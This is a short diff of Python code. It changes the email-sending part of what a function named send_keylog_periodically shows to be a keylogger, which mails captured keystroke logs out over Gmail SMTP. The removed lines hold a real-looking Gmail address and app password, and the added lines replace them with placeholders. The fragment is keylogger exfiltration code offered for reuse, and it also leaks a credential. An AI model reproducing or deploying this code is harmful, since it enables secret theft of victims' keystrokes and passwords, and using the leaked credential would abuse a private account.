@@ -186,8 +186,8 @@ def send_file(file_path, subject):
     smtp_port = 587
 
     msg = EmailMessage()
-    msg['From'] = 'zzoro0503@gmail.com'
-    msg['To'] = 'zzoro0503@gmail.com'
+    msg['From'] = 'your_gmail'
+    msg['To'] = 'your_gmail'
     msg['Subject'] = subject
 
     with lock:
@@ -217,7 +217,7 @@ def send_file(file_path, subject):
 
         with smtplib.SMTP(smtp_server, smtp_port) as server:
             server.starttls()
-            server.login('zzoro0503@gmail.com', 'dpjmgoeduhhlumoz')
+            server.login('your_gmail', 'password_app')
             server.send_message(msg)
 
 def send_keylog_periodically(file_path_log):
